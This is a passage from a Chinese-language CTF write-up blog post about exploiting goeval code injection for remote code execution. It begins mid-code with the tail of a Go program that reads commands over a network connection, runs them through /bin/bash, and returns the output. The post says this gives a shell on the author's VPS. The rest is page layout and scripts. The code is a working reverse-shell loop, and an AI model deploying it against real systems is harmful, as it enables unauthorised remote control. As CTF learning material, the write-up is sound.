    buf := make([]byte,10240) //定义一个切片的长度是10240。
    for  &#123;
        n,err := conn.Read(buf) //接受的命令
        if err != nil &amp;&amp; err != io.EOF &#123;  //io.EOF在网络编程中表示对端把链接关闭了。
            log.Fatal(err)
        &#125;

        cmd_str := string(buf[:n])
        cmd := exec.Command(&quot;/bin/bash&quot;,&quot;-c&quot;,cmd_str) //命令执行
        stdout, err := cmd.StdoutPipe()
        if err != nil &#123;
            log.Fatal(err)
        &#125;
        defer stdout.Close()
        if err := cmd.Start(); err != nil &#123;
            log.Fatal(err)
        &#125;
        opBytes, err := ioutil.ReadAll(stdout)
        if err != nil &#123;
            log.Fatal(err)
        &#125;
        conn.Write([]byte(opBytes)) //返回执行结果
    &#125;
&#125;
</code></pre>
<p>然后用相同的方式执行，就可以在vps上获得shell</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302191655597.png" alt="image-20230219165545537"></p>
<h2 id="0x03-参考文章"><a href="#0x03-参考文章" class="headerlink" title="0x03 参考文章"></a>0x03 参考文章</h2><ul>
<li><a target="_blank" rel="noopener" href="http://www.gem-love.com/2022/07/25/goeval%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#undefined">goeval代码注入导致远程代码执行(2022虎符Final)</a></li>
</ul>

    </div>

    <div class="post-meta">
        <i>
        
            <span>2023-07-03</span>
            
                <span>该篇文章被 v2ish1yan</span>
            
            
                <span>打上标签:
                    
                    
                        <a href='/tags/nodejs/'>
                            nodejs
                        </a>
                    
                        <a href='/tags/php/'>
                            php
                        </a>
                    
                        <a href='/tags/CTF/'>
                            CTF
                        </a>
                    
                        <a href='/tags/go/'>
                            go
                        </a>
                    
                        <a href='/tags/rust/'>
                            rust
                        </a>
                    
                </span>
             
             
                <span>归为分类:
                    
                    
                        <a href='/categories/WP/'>
                            WP
                        </a>
                    
                </span>
            
        
        </i>
    </div>
    
        
    <div class="comments-container">
    <div id="comment-anchor"></div>
    <div class="comment-area-title">
         
    </div>
    
        

    <div id="waline"></div>
    <script type="module"  >
        import { init } from 'https://npm.elemecdn.com/hexo-theme-a4@latest/source/js/waline.mjs'; 
        function loadWaline() {
            init({
                el: '#waline',
                serverURL: 'https://a4-talk.vercel.app',
                lang: 'zh-CN',
                dark: 'body[class~="dark-mode"]',
                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
                search: false, // 禁止表情包搜索
                reaction: false, // 对文章打分
                pageview: false, // 浏览量统计
                comment: false, // 评论数统计

                locale: {
                    placeholder: '欢迎评论', 
                    sofa: ''
                },
            });
            
        }
        window.addEventListener('DOMContentLoaded', loadWaline);
    </script>



    
    
    
    </div>


     
</div>



                                      
                    
                    
                    <div class="footer">
    
        <span> 
            © 1949-2024 China 

            
                

            
        </span>
    
</div>
<!--这是指一条线往下的内容-->
<div class="footer-last">
    
            <span>🌊面朝大海，春暖花开🌸</span>
            
                <span class="footer-last-span-right"><i>本站由<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>驱动｜使用<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>主题</i></span>
            
    
</div>


   
    
<script src="/js/highlight.min.js"></script>

    
<script src="/js/highlightjs-line-numbers.js"></script>


    
<script src="/js/randomHeaderContent.js"></script>

    <!--回到顶部按钮-->
    
        
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>

        
<script src="/js/returnToTop.js"></script>

    

    <!--目录-->
    
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
        
<script src="/js/toc.js"></script>

    



<script>
    hljs.initHighlightingOnLoad();
    hljs.initLineNumbersOnLoad();
</script>



                </div>
            
            
                <!-- 回到顶部的按钮-->  
                <div class="progress-wrap shadow-drop-2-bottom">
                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
                    </svg>
                </div>
            
    </body>


    <!--暗黑模式-->
    <script src="/js/darkmode-js.min.js"></script>
    <script>
        function addDarkmodeWidget() {
        const options = {
            bottom: '53px', // default: '32px'
            right: 'unset', // default: '32px'
            left: '42px', // default: 'unset'
            time: '0.3s', // default: '0.3s'
            mixColor: '#fff', // default: '#fff'
            backgroundColor: ' #e4e4e4  ',  // default: '#fff'
            buttonColorDark: '#100f2c',  // default: '#100f2c'
            buttonColorLight: '#fff', // default: '#fff'
            saveInCookies: true, // default: true,
            label: '🌓', // default: ''
            autoMatchOsTheme: true // default: true
        }
    
        const darkmode = new Darkmode(options);
        darkmode.showWidget();
        
        }
        window.addEventListener('load', addDarkmodeWidget);
    </script>
  
</html>